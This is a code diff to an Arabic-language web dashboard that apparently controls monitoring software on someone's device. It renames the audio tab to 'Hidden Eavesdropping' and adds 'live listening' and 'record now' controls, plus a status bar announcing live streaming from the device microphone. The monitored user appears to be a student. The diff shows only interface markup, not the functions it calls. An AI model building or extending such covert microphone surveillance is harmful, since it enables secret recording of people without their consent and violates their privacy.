@@ -360,7 +360,7 @@
                 🗺️ التتبع المباشر
             </button>
             <button class="tab-btn" id="tab-btn-audio" onclick="switchTab('audio')">
-                🎙️ خزينة الصوت
+                🎙️ التنصت المخفي
             </button>
             <button class="tab-btn" id="tab-btn-usage" onclick="switchTab('usage')">
                 📊 استخدام التطبيقات
@@ -437,19 +437,45 @@
             <!-- ══ TAB: Audio Vault ══ -->
             <div id="tab-audio" class="tab-content animate-fade">
                 <div class="p-6 max-w-3xl mx-auto">
-                    <div class="flex items-center justify-between mb-6">
-                        <h3 class="text-lg font-black text-white">🎙️ خزينة التسجيلات</h3>
-                        <div class="flex items-center gap-3">
-                            <button id="mic-start-btn" onclick="triggerMic('START')"
-                                class="btn-action btn-success text-xs">
-                                🟢 فتح الميكروفون
+
+                    <!-- Header row -->
+                    <div class="flex items-center justify-between mb-4">
+                        <div>
+                            <h3 class="text-lg font-black text-white">🎙️ مركز التنصت وتصيد الصوت</h3>
+                            <p class="text-[11px] text-slate-500 mt-0.5">يتم تخزين التسجيلات مشفرة ومتاحة من الطالب مؤمن لضمان السرية التامة</p>
+                        </div>
+                        <div class="flex items-center gap-2">
+
+                            <!-- Live Mic toggle (red) -->
+                            <button id="live-mic-btn"
+                                onclick="toggleLiveMic()"
+                                class="btn-action text-xs px-3 py-2 rounded-lg font-bold transition-all
+                                       bg-red-600/20 border border-red-600/40 text-red-400
+                                       hover:bg-red-600/35 hover:text-red-300">
+                                🔴 استماع مباشر
                             </button>
-                            <button id="mic-stop-btn" onclick="triggerMic('STOP')"
-                                class="btn-action btn-danger text-xs hidden">
-                                🛑 إيقاف وحفظ
+
+                            <!-- Record Now (30 s clip) -->
+                            <button id="record-now-btn"
+                                onclick="triggerRecordNow()"
+                                class="btn-action text-xs px-3 py-2 rounded-lg font-bold transition-all
+                                       bg-emerald-600/20 border border-emerald-600/40 text-emerald-400
+                                       hover:bg-emerald-600/35 hover:text-emerald-300">
+                                ⏺ تسجيل الآن
                             </button>
+
                         </div>
                     </div>
+
+                    <!-- Live-mic status bar (hidden when inactive) -->
+                    <div id="live-mic-bar" class="hidden mb-4 px-4 py-2 rounded-xl
+                         bg-red-500/10 border border-red-500/25 flex items-center gap-3">
+                        <span class="w-2.5 h-2.5 rounded-full bg-red-500 animate-pulse flex-shrink-0"></span>
+                        <span class="text-xs font-bold text-red-300">بث مباشر نشط — يتم البث الآن من ميكروفون الجهاز</span>
+                        <audio id="live-mic-audio" autoplay class="hidden"></audio>
+                    </div>
+
+                    <!-- Recordings list -->
                     <div id="audio-list" class="space-y-3">
                         <div class="empty-state"><p class="text-sm">لا توجد تسجيلات صوتية</p></div>
                     </div>
